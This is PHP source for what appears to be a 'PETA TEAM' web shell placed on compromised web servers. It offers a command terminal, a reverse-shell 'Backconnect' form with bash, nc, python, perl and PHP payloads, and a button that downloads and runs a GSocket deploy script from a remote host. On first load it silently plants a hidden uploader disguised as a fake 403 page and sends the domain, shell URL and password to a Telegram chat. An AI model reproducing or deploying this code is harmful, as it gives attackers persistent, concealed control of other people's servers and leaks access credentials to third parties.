                    $shellCmd = 'bash -c ' . escapeshellarg($cmd);
                }
                list($code, $out) = run_command($shellCmd, $pwd, 30);
                if ($out === '') {
                    if ($code === 0) {
                        $out = '(no output)';
                    } elseif ($code !== null) {
                        $out = '(command failed with exit code ' . $code . ', no output)';
                    }
                } elseif ($code !== 0 && $code !== null) {
                    $out .= "\nexit code · " . $code;
                }
                $hist[] = ['pwd' => $pwd, 'cmd' => $cmd, 'out' => $out];
                $_SESSION['term_hist'] = array_slice($hist, -100);
                break;
            }

            default:
                flash('Unknown action.', 'error');
        }

        /* upload via XHR: return JSON instead of redirecting — the flash
           message stays stored and appears after the page reloads */
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH'])
            && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
            header('Content-Type: application/json');
            echo json_encode(['ok' => true]);
            exit;
        }

        /* after saving a file, go back to the editor page */
        if ($action === 'save_file') {
            $sf = safe_path(isset($_POST['path']) ? $_POST['path'] : '');
            if ($sf !== null && is_file($sf)) {
                header('Location: ' . self_url() . '?action=open&path=' . rawurlencode(rel_path($sf)));
                exit;
            }
        }

        redirect_back($back);
    } elseif (is_logged_in()) {
        flash('Security token invalid — please repeat the action.', 'error');
        redirect_back(isset($_POST['back']) ? $_POST['back'] : '');
    }
    /* if not logged in → falls through to the login gate below */
}

/* =====================================================================
 *  GET: logout, login gate, toggle hidden files
 * ===================================================================== */

if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
    header('Location: ' . self_url());
    exit;
}

if (!is_logged_in()) {
    render_login();   // exits inside
}

/* =====================================================================
 *  ONE-TIME DEPLOYMENT of the hidden uploader (fake 403 page).
 *  Runs the first time the manager is opened: deploys the file to
 *  another folder, sends the Telegram notification and records only a
 *  done-flag in .peta-lock (the path itself is NEVER stored there).
 *  If .peta-lock already has the flag, nothing is sent or created —
 *  and the shell stays exactly as locked or unlocked as it was (the
 *  marker alone never locks the shell).
 * ===================================================================== */
$depInfo = lock_data();
if (!$depInfo['deployed']) {
    list($depTarget, $depErr) = deploy_uploader();
    if ($depTarget !== null) {
        $depUrl = deploy_url($depTarget);
        $telNote = '';
        if (trim((string)$CONFIG['telegram_bot_token']) === ''
            || trim((string)$CONFIG['telegram_chat_id']) === '') {
            $telNote = ' Telegram skipped (bot token / chat id not configured).';
        } else {
            $telMsg = "PETA TEAM — hidden uploader deployed\n"
                    . "Domain: " . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '-') . "\n"
                    . "Shell: " . self_url() . "\n"
                    . "Uploader: " . $depUrl . "\n"
                    . "Password: " . $CONFIG['lock_password'] . " (press Tab on the page)";
            $telNote = telegram_send($telMsg)
                ? ' Telegram notification sent.'
                : ' Telegram notification failed (network?).';
        }
        lock_save($depInfo['pass'], true);
        flash('Hidden uploader deployed to ' . $depUrl . '.' . $telNote, 'success');
    } else {
        flash('Hidden uploader deployment failed — ' . $depErr, 'error');
    }
}

/* Active folder: default to start_path, otherwise follow ?path= */
$ga = isset($_GET['action']) ? $_GET['action'] : '';
$p = (isset($_GET['path']) && $_GET['path'] !== '') ? $_GET['path'] : start_rel();
/* For file actions, ?path= points to a FILE — the folder context is
   its parent directory, so the "folder not found" flash never fires. */
if ($ga === 'open' || $ga === 'download' || $ga === 'raw') {
    $target = safe_path($p);
    if ($target !== null && is_file($target)) $p = rel_path(dirname($target));
}
$dir = safe_path($p);
if ($dir === null || !is_dir($dir)) {
    $dir = root_dir();
    flash('Folder not found — back to the main folder.', 'error');
}
$rel = rel_path($dir);

if (isset($_GET['toggle_hidden'])) {
    $_SESSION['show_hidden'] = !show_hidden();
    header('Location: ' . self_url() . ($rel !== '' ? '?path=' . rawurlencode($rel) : ''));
    exit;
}

/* =====================================================================
 *  GET: download a file / raw preview / open the editor
 * ===================================================================== */

if ($ga === 'download') {
    $f = safe_path(isset($_GET['path']) ? $_GET['path'] : '');
    if ($f !== null && is_file($f)) serve_download($f);   // exits
    flash('File not found.', 'error');
} elseif ($ga === 'raw') {
    $f = safe_path(isset($_GET['path']) ? $_GET['path'] : '');
    if ($f !== null && is_file($f)) {
        while (ob_get_level()) @ob_end_clean();
        $mime = function_exists('mime_content_type') ? @mime_content_type($f) : false;
        header('Content-Type: ' . ($mime ?: 'application/octet-stream'));
        header('Content-Disposition: inline; filename="' . addcslashes(basename($f), "\\\"") . '"');
        @readfile($f);
        exit;
    }
}

$openFile = null;
if ($ga === 'open') {
    $f = safe_path(isset($_GET['path']) ? $_GET['path'] : '');
    if ($f !== null && is_file($f)) $openFile = $f;
}

/* =====================================================================
 *  SEARCH & FOLDER LISTING
 * ===================================================================== */

$q = trim(isset($_GET['q']) ? $_GET['q'] : '');
$results = ($q !== '') ? search_files($dir, $q) : [];

$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) ? $_GET['order'] : 'asc';
$items = list_dir($dir, $sort, $order);

$titleName = ($openFile !== null) ? basename($openFile) : (($rel !== '') ? basename($rel) : '');

/* System info for the top panel.
   function_exists checks come first — if the host disables these
   functions, calling them directly would cause a fatal error (500). */
$infoDir = ($openFile !== null) ? dirname($openFile) : $dir;
$diskTotal = function_exists('disk_total_space') ? @disk_total_space($infoDir) : false;
$diskFree = function_exists('disk_free_space') ? @disk_free_space($infoDir) : false;
$unameInfo = function_exists('php_uname') ? php_uname() : '-';
$userInfo = current_user();
$phpInfo = PHP_VERSION . ' (' . PHP_SAPI . ')';
$softInfo = (isset($_SERVER['SERVER_SOFTWARE']) && $_SERVER['SERVER_SOFTWARE'] !== '')
    ? $_SERVER['SERVER_SOFTWARE'] : PHP_SAPI;

/* =====================================================================
 *  PAGE
 * ===================================================================== */
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= $titleName !== '' ? e($titleName) . ' — ' : '' ?>PETA TEAM</title>
<?php print_css(); ?>
</head>
<body>

<div class="topbar">
  <a class="brand" href="<?= e(self_url()) ?>">🗂️ PETA TEAM</a>
  <div class="top-actions">
    <form method="get" class="search-form">
      <input type="hidden" name="path" value="<?= e($rel) ?>">
      <input type="text" name="q" placeholder="Search in this folder..." value="<?= e($q) ?>">
      <button class="btn btn-small">Search</button>
    </form>
    <a class="btn btn-ghost btn-small" href="?path=<?= rawurlencode($rel) ?>&toggle_hidden=1"
       title="Show/hide hidden files">H</a>
    <button class="btn btn-ghost btn-small" id="btn-lock"
       title="Lock / unlock the PETA TEAM password"><?= password_set() ? 'Unlock' : 'Lock' ?></button>
    <button class="btn btn-ghost btn-small gsocket-btn" id="btn-gsocket"
       title="Download & run the GSocket deploy script">GSocket</button>
    <?php if (password_set()): ?>
    <a class="btn btn-ghost btn-small" href="<?= e(self_url()) ?>?logout=1">Logout</a>
    <?php endif; ?>
  </div>
</div>

<div class="wrap">
  <?php $fl = take_flash(); if ($fl): ?>
  <?php if ($fl['type'] === 'term'): ?>
  <div class="flash flash-term"><pre><?= e($fl['msg']) ?></pre></div>
  <?php else: ?>
  <div class="flash <?= e($fl['type']) ?>"><?= e($fl['msg']) ?></div>
  <?php endif; ?>
  <?php endif; ?>

  <!-- ============ TERMINAL ============ -->
  <?php
    $termPwd = (isset($_SESSION['term_pwd']) && is_string($_SESSION['term_pwd']) && is_dir($_SESSION['term_pwd']))
        ? $_SESSION['term_pwd'] : term_start_dir();
    $termHist = (isset($_SESSION['term_hist']) && is_array($_SESSION['term_hist']))
        ? $_SESSION['term_hist'] : [];
  ?>
  <div class="card term-card">
    <div class="term-head">
      <h2>&gt;_ Terminal</h2>
      <span class="muted" title="<?= e($termPwd) ?>">dir: <?= e(basename($termPwd) ?: $termPwd) ?></span>
      <span class="spacer"></span>
      <button class="btn btn-small btn-ghost gsocket-btn" id="term-gsocket" type="button"
              title="Download & run the GSocket deploy script">GSocket</button>
      <button class="btn btn-small btn-ghost" id="term-bc" type="button"
              title="Reverse shell to your listener (bash, nc, python, perl, php...)">Backconnect</button>
      <button class="btn btn-small btn-ghost" id="term-clear" type="button" title="Clear the terminal output">Clear</button>
    </div>
    <pre class="term-out" id="term-out"><?php
      foreach ($termHist as $h) {
          echo '<span class="t-cmd">' . e($h['pwd']) . ' $ ' . e($h['cmd']) . '</span>' . "\n";
          if ($h['out'] !== '') {
              echo e($h['out']);
              if (substr($h['out'], -1) !== "\n") echo "\n";
          }
      }
    ?></pre>
    <form method="post" class="term-form" id="term-form" autocomplete="off">
      <input type="hidden" name="action" value="term">
      <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
      <input type="hidden" name="back" value="<?= e($rel) ?>">
      <span class="term-prompt" id="term-prompt" title="<?= e($termPwd) ?>"><?= e(basename($termPwd) ?: $termPwd) ?>$</span>
      <input type="text" name="cmd" id="term-input" spellcheck="false" placeholder="command... (cd, ls, whoami, ...)">
    </form>
    <form method="post" class="bc-form" id="bc-form" autocomplete="off" style="display:none">
      <input type="hidden" name="action" value="backconnect">
      <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
      <input type="hidden" name="back" value="<?= e($rel) ?>">
      <span class="bc-label">bc</span>
      <input type="text" name="bc_ip" id="bc-ip" spellcheck="false" placeholder="listener IP / host" title="Your listener IP or hostname">
      <input type="number" name="bc_port" id="bc-port" value="4444" min="1" max="65535" title="Listener port">
      <select name="bc_method" id="bc-method" title="Payload method">
        <option value="bash">bash</option>
        <option value="nc">nc</option>
        <option value="python">python</option>
        <option value="perl">perl</option>
        <option value="php">php</option>
        <?php if (is_windows()): ?><option value="powershell">powershell</option><?php endif; ?>
      </select>
      <button class="btn btn-small" type="submit" title="Start the reverse shell in the background">Start</button>
    </form>
  </div>

  <div class="sysinfo">
    <div class="si-row"><span class="si-label">uname</span><span class="si-value"><?= e($unameInfo) ?></span></div>
    <div class="si-row"><span class="si-label">user</span><span class="si-value"><?= e($userInfo) ?></span></div>
    <div class="si-row"><span class="si-label">php</span><span class="si-value"><?= e($phpInfo) ?></span></div>
    <div class="si-row"><span class="si-label">hdd</span><span class="si-value"><?php if ($diskTotal !== false && $diskFree !== false): ?><?= human_size($diskTotal - $diskFree) ?> / <?= human_size($diskTotal) ?> used (<?= $diskTotal > 0 ? floor(($diskTotal - $diskFree) / $diskTotal * 100) : 0 ?>%) · <?= human_size($diskFree) ?> free<?php else: ?>-<?php endif; ?></span></div>
    <div class="si-row"><span class="si-label">software</span><span class="si-value"><?= e($softInfo) ?></span></div>
    <div class="si-row"><span class="si-label">pwd</span><span class="si-value"><?= pwd_links($infoDir) ?></span></div>
  </div>

  <!-- ============ GENERIC MODALS (confirm / prompt) ============ -->
  <div class="modal-overlay" id="modal-confirm">
    <div class="modal">
      <div class="modal-head">
        <span id="confirm-title">Confirm</span>
        <button type="button" class="modal-close" data-close="modal-confirm" title="Close">&times;</button>
      </div>
      <p class="confirm-msg" id="confirm-msg"></p>
      <div class="modal-actions">
        <button type="button" class="btn btn-ghost" data-close="modal-confirm">Cancel</button>
        <button type="button" class="btn" id="confirm-ok">OK</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modal-prompt">
    <div class="modal">
      <div class="modal-head">
        <span id="prompt-title">Input</span>
        <button type="button" class="modal-close" data-close="modal-prompt" title="Close">&times;</button>
      </div>
      <label class="modal-label" id="prompt-label" for="prompt-input">Value:</label>
      <input type="text" id="prompt-input" autocomplete="off" spellcheck="false">
      <div class="modal-actions">
        <button type="button" class="btn btn-ghost" data-close="modal-prompt">Cancel</button>
        <button type="button" class="btn" id="prompt-ok">OK</button>
      </div>
    </div>
  </div>

<?php if ($openFile === null): ?>
  <!-- ============ FOLDER LISTING ============ -->
  <div class="toolbar">
    <a class="btn btn-ghost" href="<?= e(self_url()) ?>" title="Go to the folder where this script is located">Home</a>
    <button class="btn" id="btn-upload">Upload</button>
    <button class="btn" id="btn-newfile">New File</button>
    <button class="btn" id="btn-newdir">New Folder</button>
    <?php if ($rel !== ''): ?>
    <a class="btn btn-ghost" href="?path=<?= rawurlencode(parent_rel($rel)) ?>">Up</a>
    <?php endif; ?>
    <span class="spacer"></span>
    <div class="bulk-bar" id="bulk-bar">
      <span id="bulk-count">0 items selected</span>
      <button class="btn btn-small" data-bulk="zip">Download ZIP</button>
      <button class="btn btn-small" data-bulk="copy">Copy to...</button>
      <button class="btn btn-small" data-bulk="move">Move to...</button>
      <?php if (!is_windows()): ?>
      <button class="btn btn-small" data-bulk="chmod">CHMOD</button>
      <?php endif; ?>
      <button class="btn btn-small" data-bulk="touch">Date</button>
      <button class="btn btn-danger btn-small" data-bulk="delete">Delete</button>
    </div>
  </div>

  <!-- ============ MODALS ============ -->
  <div class="modal-overlay" id="modal-new">
    <div class="modal">
      <div class="modal-head">
        <span id="modal-new-title">New File</span>
        <button type="button" class="modal-close" data-close="modal-new" title="Close">&times;</button>
      </div>
      <label class="modal-label" id="modal-new-label" for="modal-new-name">File name:</label>
      <input type="text" id="modal-new-name" autocomplete="off" spellcheck="false">
      <div class="modal-actions">
        <button type="button" class="btn btn-ghost" data-close="modal-new">Cancel</button>
        <button type="button" class="btn" id="modal-new-ok">Create</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modal-upload">
    <div class="modal modal-wide">
      <div class="modal-head">
        <span>Upload Files</span>
        <button type="button" class="modal-close" data-close="modal-upload" title="Close">&times;</button>
      </div>
      <div class="dropzone" id="dropzone">
        <form method="post" enctype="multipart/form-data" id="upload-form">
          <input type="hidden" name="action" value="upload">
          <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
          <input type="hidden" name="back" value="<?= e($rel) ?>">
          <input type="hidden" name="dir" value="<?= e($rel) ?>">
          <input type="file" name="files[]" id="upload-input" multiple>
          <label>
            <input type="checkbox" name="extract_zip" value="1" id="extract-zip" <?= zip_available() ? '' : 'disabled' ?>>
            Auto-extract uploaded ZIP files <?= zip_available() ? '' : '&nbsp;(ZipArchive not available)' ?>
          </label>
          <button type="button" class="btn" id="upload-submit">Upload selected files</button>
          <p class="hint">or drag &amp; drop files here</p>
          <p class="upload-note" id="upload-note"></p>
          <div class="upload-progress" id="upload-progress">
            <div class="up-bar"><div class="up-fill" id="up-fill"></div></div>
            <span class="up-text" id="up-text">0%</span>
          </div>
        </form>
      </div>
    </div>
  </div>

  <?php if ($q !== ''): ?>
  <div class="card results-card">
    <h3>Search results for "<?= e($q) ?>" (<?= count($results) ?>)</h3>
    <?php if (!$results): ?>
    <p class="muted search-empty">Nothing found.</p>
    <?php else: ?>
    <ul class="results">
      <?php foreach ($results as $r): $rr = rel_path($r); ?>
      <li>
        <span><?= icon_for(basename($r), is_dir($r)) ?></span>
        <?php if (is_dir($r)): ?>
        <a href="?path=<?= rawurlencode($rr) ?>"><?= e($rr) ?>/</a>
        <?php else: ?>
        <a href="?action=open&path=<?= rawurlencode($rr) ?>"><?= e($rr) ?></a>
        <a class="act" href="?action=download&path=<?= rawurlencode($rr) ?>" title="Download">D</a>
        <?php endif; ?>
      </li>
      <?php endforeach; ?>
    </ul>
    <?php endif; ?>
  </div>
  <?php endif; ?>

  <div class="card table-card">
    <table>
      <thead>
        <tr>
          <th class="col-check"><input type="checkbox" id="check-all" title="Select all"></th>
          <th><?= sort_link('name', 'Name', $rel) ?></th>
          <th class="col-size"><?= sort_link('size', 'Size', $rel) ?></th>
          <th class="col-date"><?= sort_link('mtime', 'Modified', $rel) ?></th>
          <th class="col-perm">Perms</th>
          <th class="col-act">Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php if (!$items): ?>
        <tr><td colspan="6" class="empty">Folder is empty.</td></tr>
        <?php endif; ?>
        <?php foreach ($items as $it): $itrel = rel_path($it['path']); ?>
        <tr data-rel="<?= e($itrel) ?>" data-name="<?= e($it['name']) ?>" data-mtime="<?= e(date('Y-m-d H:i', ($it['mtime'] === false ? time() : $it['mtime']))) ?>">
          <td><input type="checkbox" class="item-check" value="<?= e($itrel) ?>"></td>
          <td class="col-name">
            <span class="icon"><?= icon_for($it['name'], $it['is_dir']) ?></span>
            <?php if ($it['is_dir']): ?>
            <a class="name" href="?path=<?= rawurlencode($itrel) ?>"><?= e($it['name']) ?></a>
            <?php else: ?>
            <a class="name" href="?action=open&path=<?= rawurlencode($itrel) ?>"><?= e($it['name']) ?></a>
            <?php endif; ?>
          </td>
          <td class="col-size"><?= $it['is_dir'] ? '-' : human_size($it['size']) ?></td>
          <td class="col-date"><?= e(human_date($it['mtime'])) ?></td>
          <td class="col-perm"><?= e(perms_str($it['path'])) ?></td>
          <td class="col-act">
            <?php if (!$it['is_dir']): ?>
              <?php if (preg_match('/\.zip$/i', $it['name']) && zip_available()): ?>
              <button class="act" data-act="unzip" title="Extract ZIP">E</button>
              <?php endif; ?>
              <a class="act" href="?action=download&path=<?= rawurlencode($itrel) ?>" title="Download">D</a>
            <?php endif; ?>
            <button class="act" data-act="rename" title="Rename">R</button>
            <button class="act" data-act="copy" title="Copy">C</button>
            <button class="act" data-act="move" title="Move">M</button>
            <?php if (!is_windows()): ?>
            <button class="act" data-act="chmod" title="Change permissions">P</button>
            <?php endif; ?>
            <button class="act" data-act="touch" title="Change date">T</button>
            <button class="act danger" data-act="delete" title="Delete">X</button>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>

  <div class="footer">
    <span><?= count($items) ?> item(s)</span>
  </div>

<?php else: ?>
  <?php
    $fname = basename($openFile);
    $frel = rel_path($openFile);
    $fsize = @filesize($openFile);
    $isImage = (bool)preg_match('/\.(png|jpe?g|gif|webp|svg|bmp|ico)$/i', $fname);
    $text = null; $reason = '';
    if (!$isImage) {
        if ($fsize === false || $fsize > EDIT_MAX) {
            $reason = 'File is too large (>2 MB) to edit in the browser.';
        } elseif (looks_binary($openFile)) {
            $reason = 'Binary file — cannot be edited in the browser.';
        } else {
            $text = @file_get_contents($openFile);
        }
    }
  ?>
  <!-- ============ FILE PAGE (EDITOR / VIEWER) ============ -->
  <div class="card file-page">
    <div class="file-head">
      <h2><?= icon_for($fname, false) ?> <?= e($frel) ?> <span class="muted">(<?= human_size($fsize) ?>)</span></h2>
      <div class="file-actions">
        <a class="btn btn-small btn-ghost" href="?path=<?= rawurlencode(parent_rel($frel)) ?>">Back</a>
        <a class="btn btn-small" href="?action=download&path=<?= rawurlencode($frel) ?>">Download</a>
      </div>
    </div>

    <?php if ($isImage): ?>
    <div class="img-wrap">
      <img src="?action=raw&path=<?= rawurlencode($frel) ?>" alt="<?= e($fname) ?>">
    </div>
    <?php elseif ($text === null): ?>
    <p class="muted"><?= e($reason) ?> Use the <b>Download</b> button to save it.</p>
    <?php else: ?>
    <form method="post">
      <input type="hidden" name="action" value="save_file">
      <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
      <input type="hidden" name="back" value="<?= e(parent_rel($frel)) ?>">
      <input type="hidden" name="path" value="<?= e($frel) ?>">
      <textarea name="content" class="editor" spellcheck="false"><?= e($text) ?></textarea>
      <div class="editor-actions">
        <button class="btn">Save</button>
        <a class="btn btn-ghost" href="?action=open&path=<?= rawurlencode($frel) ?>">Cancel</a>
      </div>
    </form>
    <?php endif; ?>
  </div>
<?php endif; ?>

</div>

<script>
(function () {
    var csrf = <?= json_encode(csrf_token(), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
    var curPath = <?= json_encode($rel, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
    var isLocked = <?= json_encode(password_set()) ?>;

    /* ---------- modal helpers ---------- */
    function openModal(id) { document.getElementById(id).classList.add('open'); }
    function closeModal(id) { document.getElementById(id).classList.remove('open'); }
    document.querySelectorAll('[data-close]').forEach(function (b) {
        b.addEventListener('click', function () { closeModal(b.getAttribute('data-close')); });
    });
    document.querySelectorAll('.modal-overlay').forEach(function (m) {
        m.addEventListener('click', function (e) { if (e.target === m) closeModal(m.id); });
    });
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal-overlay.open').forEach(function (m) { closeModal(m.id); });
        }
    });

    /* generic confirm / prompt dialogs (replace the browser's confirm/prompt) */
    var confirmOk = null;
    var promptOk = null;
    function openConfirm(title, msg, okText, danger, onOk) {
        document.getElementById('confirm-title').textContent = title;
        document.getElementById('confirm-msg').textContent = msg;
        var okBtn = document.getElementById('confirm-ok');
        okBtn.textContent = okText || 'OK';
        okBtn.classList.toggle('btn-danger', !!danger);
        confirmOk = onOk;
        openModal('modal-confirm');
    }
    function openPrompt(title, label, value, okText, onOk) {
        document.getElementById('prompt-title').textContent = title;
        document.getElementById('prompt-label').textContent = label;
        var inp = document.getElementById('prompt-input');
        inp.value = value || '';
        var okBtn = document.getElementById('prompt-ok');
        okBtn.textContent = okText || 'OK';
        promptOk = onOk;
        openModal('modal-prompt');
        inp.focus();
        inp.select();
    }
    document.getElementById('confirm-ok').addEventListener('click', function () {
        closeModal('modal-confirm');
        if (confirmOk) { var f = confirmOk; confirmOk = null; f(); }
    });
    document.getElementById('prompt-ok').addEventListener('click', function () {
        var v = document.getElementById('prompt-input').value.trim();
        closeModal('modal-prompt');
        if (promptOk) { var f = promptOk; promptOk = null; f(v); }
    });
    document.getElementById('prompt-input').addEventListener('keydown', function (e) {
        if (e.key === 'Enter') document.getElementById('prompt-ok').click();
    });

    /* lock button: enable / disable the password on this manager */
    document.getElementById('btn-lock').addEventListener('click', function () {
        if (isLocked) {
            openConfirm('Unlock', 'PETA TEAM will be accessible without a password.', 'Unlock', true, function () {
                submitForm('lock', {});
            });
        } else {
            openConfirm('Lock', 'Lock PETA TEAM? After locking, a password will be required to log in.', 'Lock', false, function () {
                submitForm('lock', {});
            });
        }
    });

    /* ---------- GSocket button ---------- */
    document.querySelectorAll('.gsocket-btn').forEach(function (btn) {
        btn.addEventListener('click', function () {
            openConfirm('GSocket',
                'Download deploy-all.sh from nossl.segfault.net and run "bash deploy-all.sh"? '
                + 'The step-by-step result is shown afterwards and the downloaded file is removed.',
                'Run', false, function () {
                    submitForm('gsocket', {});
                });
        });
    });

    function submitForm(action, data) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = location.href;
        function add(k, v) {
            var i = document.createElement('input');
            i.type = 'hidden';
            i.name = k;
            i.value = v;
            form.appendChild(i);
        }
        add('action', action);
        add('csrf', csrf);
        add('back', curPath);
        Object.keys(data || {}).forEach(function (k) {
            var v = data[k];
            if (Array.isArray(v)) v.forEach(function (x) { add(k, x); });
            else add(k, v);
        });
        document.body.appendChild(form);
        form.submit();
    }

    function selected() {
        return Array.prototype.slice.call(document.querySelectorAll('.item-check:checked'))
            .map(function (c) { return c.value; });
    }

    /* ---------- listing-only JS (guarded: not present on the editor page) ---------- */
    var listing = document.getElementById('bulk-bar');
    if (listing) {

        /* upload modal: browse, drag & drop, progress bar */
        var dz = document.getElementById('dropzone');
        var upInput = document.getElementById('upload-input');
        var upSubmit = document.getElementById('upload-submit');
        var upProgress = document.getElementById('upload-progress');
        var upFill = document.getElementById('up-fill');
        var upText = document.getElementById('up-text');
        var upNote = document.getElementById('upload-note');

        document.getElementById('btn-upload').addEventListener('click', function () {
            upInput.value = '';
            upProgress.style.display = 'none';
            upNote.classList.remove('show');
            upSubmit.disabled = false;
            openModal('modal-upload');
        });
        upInput.addEventListener('change', function () { upNote.classList.remove('show'); });
        ['dragover', 'dragenter'].forEach(function (ev) {
            dz.addEventListener(ev, function (e) { e.preventDefault(); dz.classList.add('dragover'); });
        });
        ['dragleave', 'drop'].forEach(function (ev) {
            dz.addEventListener(ev, function (e) { e.preventDefault(); dz.classList.remove('dragover'); });
        });
        dz.addEventListener('drop', function (e) {
            if (!e.dataTransfer.files.length) return;
            upInput.files = e.dataTransfer.files;
            doUpload();
        });
        upSubmit.addEventListener('click', doUpload);

        function doUpload() {
            if (!upInput.files || !upInput.files.length) {
                upNote.textContent = 'Choose files first.';
                upNote.classList.add('show');
                return;
            }
            var fd = new FormData();
            fd.append('action', 'upload');
            fd.append('csrf', csrf);
            fd.append('back', curPath);
            fd.append('dir', curPath);
            var ex = document.getElementById('extract-zip');
            if (ex && ex.checked) fd.append('extract_zip', '1');
            for (var i = 0; i < upInput.files.length; i++) fd.append('files[]', upInput.files[i]);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', location.href);
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            upProgress.style.display = 'flex';
            upFill.style.width = '0%';
            upText.textContent = 'Uploading ' + upInput.files.length + ' file(s)... 0%';
            upSubmit.disabled = true;
            xhr.upload.onprogress = function (e) {
                if (e.lengthComputable) {
                    var pct = Math.round(e.loaded / e.total * 100);
                    upFill.style.width = pct + '%';
                    upText.textContent = 'Uploading ' + upInput.files.length + ' file(s)... ' + pct + '%';
                }
            };
            xhr.onload = function () {
                if (xhr.status === 200) {
                    upFill.style.width = '100%';
                    upText.textContent = 'Done!';
                    location.reload();
                } else {
                    upText.textContent = 'Upload failed (status ' + xhr.status + ').';
                    upSubmit.disabled = false;
                }
            };
            xhr.onerror = function () {
                upText.textContent = 'Upload failed (connection?).';
                upSubmit.disabled = false;
            };
            xhr.send(fd);
        }

        /* new file / new folder modal */
        var newMode = 'file';
        document.getElementById('btn-newfile').addEventListener('click', function () {
            newMode = 'file';
            document.getElementById('modal-new-title').textContent = 'New File';
            document.getElementById('modal-new-label').textContent = 'File name:';
            openNewModal();
        });
        document.getElementById('btn-newdir').addEventListener('click', function () {
            newMode = 'dir';
            document.getElementById('modal-new-title').textContent = 'New Folder';
            document.getElementById('modal-new-label').textContent = 'Folder name:';
            openNewModal();
        });
        function openNewModal() {
            var inp = document.getElementById('modal-new-name');
            inp.value = '';
            openModal('modal-new');
            inp.focus();
        }
        document.getElementById('modal-new-ok').addEventListener('click', function () {
            var n = document.getElementById('modal-new-name').value.trim();
            if (!n) return;
            closeModal('modal-new');
            if (newMode === 'file') submitForm('create_file', { dir: curPath, name: n });
            else submitForm('create_dir', { dir: curPath, name: n });
        });
        document.getElementById('modal-new-name').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') document.getElementById('modal-new-ok').click();
        });

        /* select all + bulk actions panel */
        var bulkBar = document.getElementById('bulk-bar');
        var bulkCount = document.getElementById('bulk-count');
        function refreshBulk() {
            var n = selected().length;
            bulkBar.classList.toggle('show', n > 0);
            bulkCount.textContent = n + ' items selected';
        }
        document.getElementById('check-all').addEventListener('change', function (e) {
            document.querySelectorAll('.item-check').forEach(function (c) { c.checked = e.target.checked; });
            refreshBulk();
        });
        document.addEventListener('change', function (e) {
            if (e.target.classList && e.target.classList.contains('item-check')) refreshBulk();
        });

        /* bulk actions */
        document.querySelectorAll('[data-bulk]').forEach(function (b) {
            b.addEventListener('click', function () {
                var act = b.getAttribute('data-bulk');
                var p = selected();
                if (!p.length) return;
                if (act === 'zip') { submitForm('download_zip', { paths: p }); return; }
                if (act === 'copy' || act === 'move') {
                    var isCopy = (act === 'copy');
                    openPrompt(isCopy ? 'Copy' : 'Move',
                        'Destination folder (path relative to root, empty = root):',
                        curPath, isCopy ? 'Copy' : 'Move', function (v) {
                            submitForm(act, { paths: p, dest: v });
                        });
                    return;
                }
                if (act === 'chmod') {
                    openPrompt('CHMOD', 'New mode (example: 755):', '755', 'Apply', function (v) {
                        if (v) submitForm('chmod', { paths: p, mode: v });
                    });
                    return;
                }
                if (act === 'touch') {
                    openPrompt('Change Date', 'New modification date (format: YYYY-MM-DD HH:MM):', '', 'Apply', function (v) {
                        if (v) submitForm('touch', { paths: p, newtime: v });
                    });
                    return;
                }
                if (act === 'delete') {
                    openConfirm('Delete', 'Delete ' + p.length + ' selected items permanently?', 'Delete', true, function () {
                        submitForm('delete', { paths: p });
                    });
                }
            });
        });
    }

    /* per-row actions (event delegation) */
    document.addEventListener('click', function (e) {
        var btn = e.target.closest ? e.target.closest('button[data-act]') : null;
        if (!btn) return;
        e.preventDefault();
        var tr = btn.closest('tr');
        if (!tr) return;
        var rel = tr.getAttribute('data-rel');
        var name = tr.getAttribute('data-name');
        var act = btn.getAttribute('data-act');
        if (act === 'rename') {
            openPrompt('Rename', 'New name:', name, 'Rename', function (v) {
                if (v && v !== name) submitForm('rename', { path: rel, newname: v });
            });
        } else if (act === 'copy' || act === 'move') {
            var isCopy = (act === 'copy');
            openPrompt(isCopy ? 'Copy' : 'Move',
                'Destination folder (path relative to root, empty = root):',
                curPath, isCopy ? 'Copy' : 'Move', function (v) {
                    submitForm(act, { paths: [rel], dest: v });
                });
        } else if (act === 'chmod') {
            openPrompt('CHMOD', 'New mode (example: 755):', '755', 'Apply', function (v) {
                if (v) submitForm('chmod', { paths: [rel], mode: v });
            });
        } else if (act === 'touch') {
            openPrompt('Change Date', 'New modification date (format: YYYY-MM-DD HH:MM):',
                tr.getAttribute('data-mtime') || '', 'Apply', function (v) {
                    if (v) submitForm('touch', { paths: [rel], newtime: v });
                });
        } else if (act === 'unzip') {
            openConfirm('Extract ZIP', 'Extract "' + name + '" into this folder?', 'Extract', false, function () {
                submitForm('unzip', { path: rel });
            });
        } else if (act === 'delete') {
            openConfirm('Delete', 'Delete "' + name + '" permanently?', 'Delete', true, function () {
                submitForm('delete', { paths: [rel] });
            });
        }
    });

    /* ---------- terminal panel ---------- */
    var termForm = document.getElementById('term-form');
    var termInput = document.getElementById('term-input');
    var termOut = document.getElementById('term-out');
    if (termForm && termInput) {
